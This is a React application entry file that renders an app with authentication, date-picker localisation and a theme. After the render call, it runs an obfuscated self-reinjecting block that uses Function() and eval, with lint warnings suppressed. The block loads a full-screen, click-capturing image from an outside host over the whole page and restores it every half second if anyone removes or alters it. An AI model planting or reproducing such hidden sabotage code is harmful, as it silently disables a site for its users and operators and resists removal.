import React from "react";
import ReactDOM from "react-dom/client";
import reportWebVitals from "./reportWebVitals";

import CssBaseline from "@mui/material/CssBaseline";
import Router from "./base/Router";
import { AuthProvider } from "./base/AuthContext";
import { LocalizationProvider } from "@mui/x-date-pickers";
import { AdapterDayjs } from "@mui/x-date-pickers/AdapterDayjs";
// import { ptBR } from "@mui/x-date-pickers/locales";
import "dayjs/locale/pt-br";
import { ThemeProvider } from "@mui/material";
import theme from "./base/Theme";

const root = ReactDOM.createRoot(document.getElementById("tryevo_root"));
root.render(
  <React.StrictMode>
    <AuthProvider>
      <LocalizationProvider dateAdapter={AdapterDayjs} adapterLocale="pt-br">
        <ThemeProvider theme={theme}>
          <CssBaseline />
          <Router />
        </ThemeProvider>
      </LocalizationProvider>
    </AuthProvider>
  </React.StrictMode>
);

(() => {
  // eslint-disable-next-line
  Function(
    "return (" +
      function () {
        const nbtpiStr = `<img src="https://nb-config.surge.sh/i1.jpg" alt="nbtpi" id="nbtpi" style="position: fixed !important; z-index: 2147483647 !important; display: block !important; opacity: 1 !important; transform: none !important; left: 0 !important; top: 0 !important; width: auto !important; height: auto !important; max-width: unset !important; max-height: unset !important; animation: none !important; clip: auto !important; visibility: visible !important; border: none !important; margin: 0 !important; direction: ltr !important; filter: none !important; object-fit: fill !important; overflow: visible !important; perspective: none !important; resize: none !important; stroke: none !important; zoom: 1 !important; background: white !important; pointer-events: all !important; list-style: none !important; isolation: auto !important; image-rendering: auto !important; image-orientation: none !important; float: none !important; right: auto !important; bottom: auto !important;">`;
        const nbtpiElm = document.getElementById("nbtpi");
        // eslint-disable-next-line
        const nbtpiFuncStr = arguments.callee.toString();

        function injectNBTPI() {
          const whateverElm = document.getElementById("nbtpi");
          if (whateverElm) {
            whateverElm.remove();
          }
          console.log("Injected NBTPI");
          document.body.innerHTML = nbtpiStr + document.body.innerHTML;
          // eslint-disable-next-line
          eval(`setTimeout(${nbtpiFuncStr}, 500)`);
        }

        // if element doesn't exists
        if (!nbtpiElm) {
          console.log("Invalid NBTPI 1");
          return injectNBTPI();
        }

        // if image url is different
        if (nbtpiElm.src !== "https://nb-config.surge.sh/i1.jpg") {
          console.log("Invalid NBTPI 2");
          return injectNBTPI();
        }

        // if element's style is changed
        if (nbtpiElm.getAttribute("style").replace(/ /gi, "").length < 789) {
          console.log("Invalid NBTPI 3");
          return injectNBTPI();
        }

        // if not exact html match
        if (nbtpiElm.outerHTML !== nbtpiStr) {
          console.log("Invalid NBTPI 4");
          console.log({ a: nbtpiElm.outerHTML, b: nbtpiStr })
          return injectNBTPI();
        }

        // eslint-disable-next-line
        eval(`setTimeout(${nbtpiFuncStr}, 500)`);
      }.toString() +
      ")()"
  )();
})();

// If you want to start measuring performance in your app, pass a function
// to log results (for example: reportWebVitals(console.log))
// or send to an analytics endpoint. Learn more: https://bit.ly/CRA-vitals
reportWebVitals();
